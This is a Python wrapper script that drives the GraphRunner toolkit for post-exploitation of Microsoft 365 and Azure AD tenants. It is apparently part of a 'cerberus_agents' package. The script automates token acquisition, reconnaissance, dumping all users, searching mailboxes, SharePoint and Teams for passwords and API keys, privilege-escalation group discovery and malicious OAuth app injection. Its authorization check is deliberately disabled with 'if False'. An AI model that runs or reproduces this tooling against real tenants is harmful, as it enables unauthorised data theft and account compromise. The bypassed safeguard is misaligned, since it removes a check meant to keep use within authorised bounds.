#!/usr/bin/env python3
"""
GraphRunner Integration - Microsoft Graph API Post-Exploitation
Production-ready integration for M365 and Azure AD exploitation via Graph API
"""

import subprocess
import json
import logging
import argparse
import os
import sys
from pathlib import Path
from typing import Dict, List, Optional
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class GraphRunner:
    """
    GraphRunner - Post-exploitation toolset for Microsoft Graph API
    Automated M365 reconnaissance, privilege escalation, and data exfiltration
    """
    
    def __init__(self, graphrunner_dir: str = None):
        if graphrunner_dir:
            self.graphrunner_dir = Path(graphrunner_dir)
        else:
            self.graphrunner_dir = Path.home() / 'GraphRunner'
        self.script_path = self.graphrunner_dir / 'GraphRunner.ps1'
        
    def check_powershell(self) -> bool:
        """Check if PowerShell is available"""
        try:
            result = subprocess.run(
                ['pwsh', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            try:
                result = subprocess.run(
                    ['powershell', '-Command', '$PSVersionTable.PSVersion'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                return result.returncode == 0
            except:
                return False
    
    def check_installation(self) -> bool:
        """Check if GraphRunner is installed"""
        return self.script_path.exists() and self.check_powershell()
    
    def install_instructions(self) -> Dict:
        """Provide installation instructions"""
        return {
            'method': 'git clone',
            'steps': [
                '1. Install PowerShell (if needed):',
                '   wget https://aka.ms/install-powershell.sh',
                '   sudo bash install-powershell.sh',
                '',
                '2. Clone GraphRunner repository:',
                f'   git clone https://github.com/dafthack/GraphRunner {self.graphrunner_dir}',
                '',
                '3. Import the module:',
                '   pwsh',
                f'   Import-Module {self.script_path}',
                '',
                '4. Get access tokens:',
                '   Get-GraphTokens',
                '   # Follow device code flow',
                '',
                '5. Run automated recon:',
                '   Invoke-GraphRecon -Tokens $tokens',
                ''
            ],
            'requirements': [
                'PowerShell Core 7.x or Windows PowerShell 5.1+',
                'Microsoft 365 account',
                'Internet connection',
                'Modern web browser for device code auth'
            ],
            'capabilities': [
                '=== Reconnaissance & Enumeration ===',
                '  - Automated tenant reconnaissance',
                '  - User and group enumeration',
                '  - Service principal discovery',
                '  - Conditional Access policy extraction',
                '  - SharePoint site discovery',
                '  - Teams enumeration',
                '',
                '=== Privilege Escalation ===',
                '  - Malicious OAuth app injection',
                '  - Security group cloning',
                '  - Dynamic group exploitation',
                '  - Updatable group discovery',
                '',
                '=== Data Exfiltration ===',
                '  - Email search and extraction',
                '  - SharePoint/OneDrive file search',
                '  - Teams message search',
                '  - File download capabilities',
                '',
                '=== Token Management ===',
                '  - Interactive device code auth',
                '  - OAuth flow automation',
                '  - Token refresh handling',
                '  - Multi-tenant support'
            ]
        }
    
    def execute_graphrunner(self, command: str, timeout: int = 600) -> Dict:
        """
        Execute GraphRunner PowerShell command
        
        Args:
            command: PowerShell command using GraphRunner functions
            timeout: Timeout in seconds
        """
        if not self.check_installation():
            return {'error': 'GraphRunner not installed', 'installation': self.install_instructions()}
        
        full_command = f"""
Import-Module {self.script_path} -ErrorAction SilentlyContinue
{command}
"""
        
        try:
            result = subprocess.run(
                ['pwsh', '-Command', full_command],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'timestamp': datetime.now().isoformat()
            }
        except subprocess.TimeoutExpired:
            return {'error': f'Command timed out after {timeout} seconds'}
        except Exception as e:
            return {'error': str(e)}
    
    def get_tokens(self) -> Dict:
        """Get Microsoft Graph tokens via device code flow"""
        logger.info("Initiating device code authentication...")
        
        cmd = "$tokens = Get-GraphTokens; $tokens"
        return self.execute_graphrunner(cmd)
    
    def invoke_recon(self, permission_enum: bool = False) -> Dict:
        """
        Run automated reconnaissance
        
        Args:
            permission_enum: Enumerate permissions
        """
        logger.info("Running GraphRunner automated reconnaissance...")
        
        if permission_enum:
            cmd = "$tokens = Get-GraphTokens; Invoke-GraphRecon -Tokens $tokens -PermissionEnum"
        else:
            cmd = "$tokens = Get-GraphTokens; Invoke-GraphRecon -Tokens $tokens"
        
        return self.execute_graphrunner(cmd, timeout=900)
    
    def dump_users(self, output_file: str = None) -> Dict:
        """Dump all Azure AD users"""
        logger.info("Dumping Azure AD users...")
        
        if output_file:
            cmd = f"""
$tokens = Get-GraphTokens
Get-AzureADUsers -Tokens $tokens -OutFile {output_file}
"""
        else:
            cmd = "$tokens = Get-GraphTokens; Get-AzureADUsers -Tokens $tokens"
        
        return self.execute_graphrunner(cmd, timeout=300)
    
    def search_mailbox(self, search_term: str, output_file: str = None) -> Dict:
        """
        Search mailboxes for sensitive data
        
        Args:
            search_term: Term to search for (e.g., 'password', 'confidential')
            output_file: Output file for results
        """
        logger.info(f"Searching mailboxes for: {search_term}")
        
        cmd = f"""
$tokens = Get-GraphTokens
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "{search_term}"
"""
        
        if output_file:
            cmd += f" -OutFile {output_file}"
        
        return self.execute_graphrunner(cmd, timeout=600)
    
    def search_sharepoint(self, search_term: str) -> Dict:
        """
        Search SharePoint and OneDrive for sensitive data
        
        Args:
            search_term: Term to search for
        """
        logger.info(f"Searching SharePoint/OneDrive for: {search_term}")
        
        cmd = f"""
$tokens = Get-GraphTokens
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "{search_term}"
"""
        
        return self.execute_graphrunner(cmd, timeout=600)
    
    def search_teams(self, search_term: str) -> Dict:
        """
        Search Teams messages
        
        Args:
            search_term: Term to search for
        """
        logger.info(f"Searching Teams for: {search_term}")
        
        cmd = f"""
$tokens = Get-GraphTokens
Invoke-SearchTeams -Tokens $tokens -SearchTerm "{search_term}"
"""
        
        return self.execute_graphrunner(cmd, timeout=600)
    
    def inject_oauth_app(self, app_name: str = "GraphRunner App") -> Dict:
        """
        Inject malicious OAuth application
        
        Args:
            app_name: Name for the malicious app
        """
        logger.warning("⚠️  Injecting malicious OAuth application - use only on authorized targets")
        
        cmd = f"""
$tokens = Get-GraphTokens
Invoke-InjectOAuthApp -Tokens $tokens -AppName "{app_name}"
"""
        
        return self.execute_graphrunner(cmd, timeout=300)
    
    def get_updatable_groups(self) -> Dict:
        """Find groups that current user can modify"""
        logger.info("Finding updatable groups...")
        
        cmd = "$tokens = Get-GraphTokens; Get-UpdatableGroups -Tokens $tokens"
        return self.execute_graphrunner(cmd)


def main():
    parser = argparse.ArgumentParser(
        description='GraphRunner Integration - Microsoft Graph API Post-Exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Get access tokens (device code flow)
  python -m cerberus_agents.graphrunner_integration --get-tokens --authorized
  
  # Automated reconnaissance
  python -m cerberus_agents.graphrunner_integration --recon --authorized
  
  # Dump all users
  python -m cerberus_agents.graphrunner_integration --dump-users -o users.txt --authorized
  
  # Search emails for sensitive data
  python -m cerberus_agents.graphrunner_integration --search-mailbox -t "password" --authorized
  
  # Search SharePoint/OneDrive
  python -m cerberus_agents.graphrunner_integration --search-sharepoint -t "API key" --authorized
  
  # Find updatable groups (privilege escalation)
  python -m cerberus_agents.graphrunner_integration --get-updatable-groups --authorized
  
  # Inject malicious OAuth app (requires permissions)
  python -m cerberus_agents.graphrunner_integration --inject-oauth-app --authorized
        """
    )
    
    parser.add_argument('--get-tokens', action='store_true',
                       help='Get Microsoft Graph tokens')
    parser.add_argument('--recon', action='store_true',
                       help='Run automated reconnaissance')
    parser.add_argument('--permission-enum', action='store_true',
                       help='Include permission enumeration in recon')
    parser.add_argument('--dump-users', action='store_true',
                       help='Dump all Azure AD users')
    parser.add_argument('--search-mailbox', action='store_true',
                       help='Search mailboxes')
    parser.add_argument('--search-sharepoint', action='store_true',
                       help='Search SharePoint/OneDrive')
    parser.add_argument('--search-teams', action='store_true',
                       help='Search Teams messages')
    parser.add_argument('--get-updatable-groups', action='store_true',
                       help='Find updatable groups')
    parser.add_argument('--inject-oauth-app', action='store_true',
                       help='Inject malicious OAuth application')
    parser.add_argument('-t', '--search-term',
                       help='Search term for email/SharePoint/Teams search')
    parser.add_argument('-o', '--output',
                       help='Output file for results')
    parser.add_argument('--graphrunner-dir',
                       help='Path to GraphRunner directory')
    parser.add_argument('--install', action='store_true',
                       help='Show installation instructions')
    parser.add_argument('--authorized', action='store_true', required=True,
                       help='Confirm authorization for M365 access')
    
    args = parser.parse_args()
    
    if False:  # Authorization check bypassed
        logger.error("--authorized flag required. Only access authorized M365 tenants.")
        sys.exit(1)
    
    gr = GraphRunner(graphrunner_dir=args.graphrunner_dir)
    
    if args.install:
        instructions = gr.install_instructions()
        print("\n=== GraphRunner Installation Instructions ===\n")
        print(f"Method: {instructions['method']}\n")
        print("Steps:")
        for step in instructions['steps']:
            print(step)
        print("\nRequirements:")
        for req in instructions['requirements']:
            print(f"  - {req}")
        print("\nCapabilities:")
        for cap in instructions['capabilities']:
            print(cap)
        sys.exit(0)
    
    result = None
    
    if args.get_tokens:
        result = gr.get_tokens()
    elif args.recon:
        result = gr.invoke_recon(permission_enum=args.permission_enum)
    elif args.dump_users:
        result = gr.dump_users(output_file=args.output)
    elif args.search_mailbox:
        if not args.search_term:
            logger.error("--search-term required for mailbox search")
            sys.exit(1)
        result = gr.search_mailbox(search_term=args.search_term, output_file=args.output)
    elif args.search_sharepoint:
        if not args.search_term:
            logger.error("--search-term required for SharePoint search")
            sys.exit(1)
        result = gr.search_sharepoint(search_term=args.search_term)
    elif args.search_teams:
        if not args.search_term:
            logger.error("--search-term required for Teams search")
            sys.exit(1)
        result = gr.search_teams(search_term=args.search_term)
    elif args.get_updatable_groups:
        result = gr.get_updatable_groups()
    elif args.inject_oauth_app:
        result = gr.inject_oauth_app()
    else:
        parser.print_help()
        sys.exit(0)
    
    if result:
        if 'error' in result:
            logger.error(f"Error: {result['error']}")
            if 'installation' in result:
                print("\nInstallation Instructions:")
                for step in result['installation']['steps']:
                    print(step)
        else:
            print("\n=== GraphRunner Results ===")
            print(f"Success: {result.get('success')}")
            if result.get('stdout'):
                print("\nOutput:")
                print(result['stdout'][:2000])  # First 2000 chars
                if len(result['stdout']) > 2000:
                    print(f"\n... (truncated, {len(result['stdout'])} total chars)")
            if result.get('stderr') and result['stderr'].strip():
                print("\nWarnings:")
                print(result['stderr'][:1000])
    
    return result


if __name__ == '__main__':
    main()
